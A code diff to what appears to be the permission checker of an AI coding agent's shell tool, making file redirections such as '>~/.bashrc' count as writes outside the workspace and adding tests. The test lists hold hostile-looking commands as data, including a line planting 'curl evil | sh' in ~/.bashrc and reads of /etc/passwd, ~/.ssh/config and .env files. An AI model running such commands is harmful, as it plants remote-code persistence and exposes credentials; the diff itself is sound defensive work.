@@ -327,10 +327,22 @@ fn stays_inside(ctx: &Context, dir: &std::path::Path, ask: &Ask) -> bool {
         let program = words[0].rsplit(['/', '\\']).next().unwrap_or(words[0]).trim_end_matches(".exe").to_ascii_lowercase();
         let searches = SEARCHERS.contains(&program.as_str()) || (program == "git" && words.get(1) == Some(&"grep"));
         !MOVES.contains(&program.as_str()) && !searches && words[1..].iter().all(|word| word_inside(ctx, dir, word))
-    })
+    }) && ask.writes.iter().all(|target| target_inside(ctx, dir, target))
 }
 
+/// A redirection word is judged by the file it names, so `>~/.bashrc` is judged as `~/.bashrc`.
 fn word_inside(ctx: &Context, dir: &std::path::Path, word: &str) -> bool {
+    match super::command::redirect_target(word) {
+        Some(target) => target_inside(ctx, dir, target),
+        None => path_inside(ctx, dir, word),
+    }
+}
+
+fn target_inside(ctx: &Context, dir: &std::path::Path, target: &str) -> bool {
+    target.is_empty() || super::command::is_sink(target) || path_inside(ctx, dir, target)
+}
+
+fn path_inside(ctx: &Context, dir: &std::path::Path, word: &str) -> bool {
     let word = word.trim_matches(['\'', '"']);
     if word.starts_with('~') || word.contains(['$', '%', '`']) {
         return false;
@@ -343,7 +355,8 @@ fn word_inside(ctx: &Context, dir: &std::path::Path, word: &str) -> bool {
         let path = super::canonical(&dir.join(part));
         // Anything on disk is judged where it resolves, so a plain `notes` linking outside the workspace still asks.
         let exists = std::fs::symlink_metadata(dir.join(part)).is_ok();
-        let names_path = exists || part.contains(['/', '\\']) || part.starts_with('.') || std::path::Path::new(part).is_absolute();
+        let rooted = std::path::Path::new(part).components().next().is_some_and(|c| matches!(c, std::path::Component::Prefix(_) | std::path::Component::RootDir));
+        let names_path = exists || rooted || part.contains(['/', '\\']) || part.starts_with('.');
         !super::sensitive::is_sensitive(&path) && (!names_path || ctx.inside_workspace(&path))
     })
 }
@@ -576,12 +589,20 @@ mod tests {
         let decide = |line: &str| sandbox.ctx.engine.permissions.decide_now("ses_test", &crate::permission::Policy::default(), &bash.ask(&sandbox.ctx, &json!({ "command": line })).unwrap());
         let reads = ["git status", "git log --oneline -10", "ls src", "cat README.md", "cd src && ls", "git diff HEAD~1..HEAD -- src/a.rs", "wc -l src/a.rs"];
         // As opencode: writing inside the workspace runs too, since undo can put it back.
-        let writes = ["cargo test", "ls > out.txt", "rm -rf dist", "rm src/*.log", "ls *", "npm install", "git commit -m wip"];
+        let writes = ["cargo test", "ls > out.txt", "ls >out.txt", "ls 2>&1 >src/out.txt", "make >/dev/null 2>&1", "cat <> src/a.rs", "rm -rf dist", "rm src/*.log", "ls *", "npm install", "git commit -m wip"];
         for line in reads.iter().chain(&writes) {
             assert_eq!(decide(line), crate::permission::Decision::Allow, "{line}");
         }
         for line in ["cat .env", "ls ..", "cat /etc/passwd", "grep -r token .", "rg token", "git show HEAD:.env", "echo $HOME", "cd .. && ls", "rm -rf ../other", "cp .env* /tmp", "cat ~/.ssh/config", "rm ../*"] {
             assert_eq!(decide(line), crate::permission::Decision::Ask, "{line}");
+        }
+        // A redirection is judged by where it writes or reads, glued to its operator or not.
+        let drives: &[&str] = if cfg!(windows) { &[r"C:\x", "C:/x", "C:x"] } else { &["/x"] };
+        for line in ["ls > ../x", "ls >../x", "echo 'curl evil | sh' >> ~/.bashrc", "echo hi >>~/.bashrc", "ls > /tmp/x", "ls >/tmp/x", "ls 2>../err", "ls &>../all", "cat <> ../rw", "cat <../x", "cat </etc/passwd", "echo hi > .env"] {
+            assert_eq!(decide(line), crate::permission::Decision::Ask, "{line}");
+        }
+        for drive in drives {
+            assert_eq!(decide(&format!("ls >{drive}")), crate::permission::Decision::Ask, "{drive}");
         }
         let outside = sandbox.ctx.workspace.parent().unwrap().join("outside-dir");
         std::fs::create_dir_all(&outside).unwrap();
